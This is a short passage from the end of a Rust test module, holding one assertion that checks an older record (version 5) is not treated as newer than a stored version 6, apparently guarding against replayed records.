        assert!(!newer_than_stored(Some(&stored(6)), &rec(5)), "an older one replayed");
    }
}
